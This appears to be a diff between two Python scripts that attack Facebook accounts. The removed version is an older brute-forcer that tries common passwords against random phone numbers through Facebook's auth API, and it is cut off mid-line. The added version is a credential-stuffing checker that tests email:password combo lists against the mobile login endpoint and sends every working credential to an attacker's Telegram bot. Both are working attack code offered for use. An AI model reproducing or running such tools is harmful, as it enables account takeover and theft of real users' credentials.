@@ -1,193 +1,88 @@
-import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
-os.system('rm -rf .txt')
-for n in range(100000):
-    nmbr = random.randint(1111111, 9999999)
-    sys.stdout = open('.txt', 'a')
-    print nmbr
-    sys.stdout.flush()
+import requests,os,time
+os.system("xdg-open https://www.facebook.com/H4M4.X")
+asho = '''
+--------| Checker Facbook |-----------
+    Auth : @Ani.coder
+    Auth : @HAMA
+    
+--------| Checker Facbook |-----------
+'''
+print(asho)
+email = input('[+] List Combo : ')
+telgramakaw = input("id tel :")
+tokenakaw = input("token bot :")
+filer = open(email,"r").readlines()
+#password = input('[+] Pass : ')
+ani2 = 0
+dyar2 = 0
+for xx in filer:
+	uu = xx.strip().split(":")
+	combo1 = uu[0]
+	combo2 = uu[1]
+	
+	headers = {
+	  "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
+	  "accept": "*/*",
+    "accept-language": "en-US,en;q=0.9",
+    "content-type": "application/x-www-form-urlencoded",
+    "cookie": "sb=JxZmYETLnD983J-sdhDKxloz; datr=JxZmYO_Kkqd0uriUeBjh7xMx; m_pixel_ratio=3; wd=375x812; x-referer=eyJyIjoiLz9zb2Z0PWJvb2ttYXJrcyIsImgiOiIvP3NvZnQ9Ym9va21hcmtzIiwicyI6Im10b3VjaCJ9; locale=ar_AR; fr=18QLqPXdXjz3wttYL.AWWp9DiM08Ikxyr3lxpLWhsftBc.BgZhYn.vb.AAA.0.0.BghxhH.AWXCrio57oI",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "x-fb-lsd": "AVoEZpcdCYo",
+    "x-requested-with": "XMLHttpRequest",
+    "x-response-format": "JSONStream",
+    "referrer": "https://mtouch.facebook.com/login/?next&ref=dbl&fl&refid=8&paipv=0",
+    "referrerPolicy": "strict-origin-when-cross-origin",
+	}
+	data = {
+	"m_ts": "1619466306",
+  "li": "QRiHYOvaTz-vUGJoT9DRid2W",
+  "try_number": "0",
+  "unrecognized_tries": "0",
+  "email": combo1,
+  "prefill_contact_point": combo1,
+  "prefill_source": "browser_dropdown",
+  "prefill_type": "contact_point",
+  "first_prefill_source": "browser_dropdown",
+  "first_prefill_type": "contact_point",
+  "had_cp_prefilled": "true",
+  "had_password_prefilled": "false",
+  "is_smart_lock": "false",
+  "bi_xrwh": "0",
+  'bi_wvdp': '{"hwc":true,"hwcr":true,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true}}',
+  "encpass": 
+  f"#PWD_BROWSER:0:&:{combo2}",
+  "fb_dtsg": "AQGASIOQEDji:AQEh9vb0OwVb",
+  "jazoest": "22026",
+  "lsd": "AVoEZpcdCYo",
+   "__dyn":   "1Z3paBwk8aU4ifDg9ppk2m3q12wAxu13w9y1DxW0Oohx61ZwcW4o3Bw4Ewk9E4W0om0MU0D2US1kw5Kwwyo1co6K0SU2swp817U2ew5fw5NyE",
+   "__csr": "",
+   "__req": "f",
+   "__a":    "AYmxEh96k_9cScVk4bBjufYTlH9mpDbiB0nLEUDjgVWxi22fc7dNMYr4Jn5XPLMJZ0O-SzDwFKZO4zVK7kRCpqFR4Nbv-iErKbEMoNulUV3cww",
+   "__user": "0"
+	}
+	url = 'https://mtouch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmtouch.facebook.com%2F&lwv=100'
+	req = requests.post(url, headers=headers, data=data).text
+#	print(req)
+	if 'CookieConsentActionHandler' in req:
+		os.system("clear")
+		print(asho)
+		ani2+=1
+		print("Hit : "+str(ani2))
+		print("Erorr : "+str(dyar2))
+		ani22 = combo1+":"+combo2
+		send_text2 =f'https://api.telegram.org/bot{tokenakaw}/sendMessage?chat_id={telgramakaw}&text={ani22}'
+		response2 = requests.get(send_text2)
+		
+	else:
+		os.system("clear")
+		print(asho)
+		dyar2+=1
+		print("Hit : "+str(ani2))
+		print("Erorr : "+str(dyar2))
 
-try:
-    import requests
-except ImportError:
-    os.system('pip2 install requests')
-
-try:
-    import mechanize
-except ImportError:
-    os.system('pip2 install mechanize')
-    time.sleep(1)
-    os.system('python2 nmbr.py')
-
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
-
-def exb():
-    print '[!] Exit'
-    os.sys.exit()
-
-
-def psb(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.03)
-
-
-def t():
-    time.sleep(1)
-
-
-def cb():
-    os.system('clear')
-
-
-logo = logo ="""
-\033[1;93m HAMA IT
-                                                            
-\033[1;97m  
-\033[1;97m          SLAMW 7ALAYKWM
-\033[1;97m  CHONN BASHNN HEWAM BASHI HAMW LAYAKA
-\033[1;97m       KURDISH TOOL BY HAMA IT 
-\033[1;97m   AM TOOLAYA HEWADARM SWDE LEBBENN
-"""
-CorrectUsername = 'HAMA'
-CorrectPassword = 'IT'
-os.system('clear')
-print logo
-loop = 'true'
-while loop == 'true':
-    username = raw_input('\x1b[1;97m\xe2\x9e\xa3\x1b\x1b[31;1m USERNAME: ')
-    if username == CorrectUsername:
-        password = raw_input('\x1b[1;97m\xe2\x9e\xa3\x1b\x1b[31;1m PASSWORD: ')
-        if password == CorrectPassword:
-            print '\x1b[1;92m[\xe2\x9c\x93] RASTA BRO BASHE DWATR '
-            time.sleep(3)
-            loop = 'false'
-        else:
-            print 'PASS HALAYA'
-    else:
-        print 'USER HALAYA'
-os.system("xdg-open https://youtube.com/channel/UCHSEcLdIr0NRuwoB_ygAYYQ")
-
-back = 0
-successful = []
-cpb = []
-oks = []
-id = []
-
-def menu():
-    os.system('clear')
-    print logo
-    print 60 * '\x1b[1;97m='
-    print '\x1b[1;93m[1]\x1b[1;93m ZHMARAKANI KURDISTAN      \x1b[1;97m\xe2\x87\x8b        \x1b[1;93m[YT]\x1b[1;93m KHATO TUBE '
-    print 60 * '\x1b[1;97m='
-    action()
-
-
-def action():
-    global cpb
-    global oks
-    bch = raw_input('\n\x1b[1;93m ZHMARA YAK HALBZHERA  \x1b[1;93m>>>\x1b[1;97m  ')
-    if bch == '':
-        print '[!] HALAYA'
-        action()
-    elif bch == '1':
-        os.system('clear')
-        print logo
-        print 60 * '\x1b[1;93m='
-        print '\x1b[1;97m 0770, 0750, 0773, 0751, 0771, 0772, 0780, 0781, 0782, 0783'
-        try:
-            c = raw_input(' CODEK HALBZHERA  : ')
-            k = ''
-            idlist = '.txt'
-            for line in open(idlist, 'r').readlines():
-                id.append(line.strip())
-
-        except IOError:
-            print '[!] HALAYA'
-            raw_input('\n[ Back ]')
-            menu()
-    elif bch == '0':
-        exb()
-    else:
-        print '[!] HALAYA'
-        action()
-    xxx = str(len(id))
-    psb('[\xe2\x9c\x93] GSHT RAQAMAKAN: ' + xxx)
-    time.sleep(0.1)
-    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;97m BWASTA GARNA BO DARAWA  QA BELA BO BAWKME NAKAI HHHHH...')
-    time.sleep(0.1)
-    psb('[!] BO WASTAN DNI TOOLAKA  [CTRL + Z] DAGRA')
-    time.sleep(0.5)
-    print 60* '\x1b[1;93m='
-
-    def main(arg):
-        user = arg
-        try:
-            os.mkdir('save')
-        except OSError:
-            pass
-
-        try:
-            pass1 = user
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;93m[HACKED BY KHATO TUBE]\x1b[1;93m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
-                okb.write(k + c + user + '>>>' + pass1 + '\n')
-                okb.close()
-                oks.append(c + user + pass1)
-            elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;97m[NABETAWA]\x1b[1;97m ' + k + c + user + ' >>> ' + pass1 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
-                cps.write(k + c + user + '>>>' + pass1 + '\n')
-                cps.close()
-                cpb.append(c + user + pass1)
-            else:
-                pass2 = '1122334455'
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;93m[HACKED BY KHATO TUBE]\x1b[1;93m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
-                okb.write(k + c + user + '>>>' + pass2 + '\n')
-                okb.close()
-                oks.append(c + user + pass2)
-            elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;97m[NABETAWA]\x1b[1;97m ' + k + c + user + ' >>> ' + pass2 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
-                cps.write(k + c + user + '>>>' + pass2 + '\n')
-                cps.close()
-                cpb.append(c + user + pass2)
-            else:
-                pass3 = '1234554321'
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;93m[HACKED BY KHATO TUBE]\x1b[1;93m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
-                okb.write(k + c + user + '>>>' + pass3 + '\n')
-                okb.close()
-                oks.append(c + user + pass3)
-            elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;97m[NABETAWA]\x1b[1;97m ' + k + c + user + ' >>> ' + pass3 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
-                cps.write(k + c + user + '>>>' + pass3 + '\n')
-                cps.close()
-                cpb.append(c + user + pass3)
-            else:
-                pass4 = '112233445566'
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;93m[HACKED BY Hama IT]\x1b[1;93m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
-                okb.write(k + c + user + '>>>' + pas
+os.system("clear")
+print("All Check Done ✓")
+time.sleep(3)
+exit()
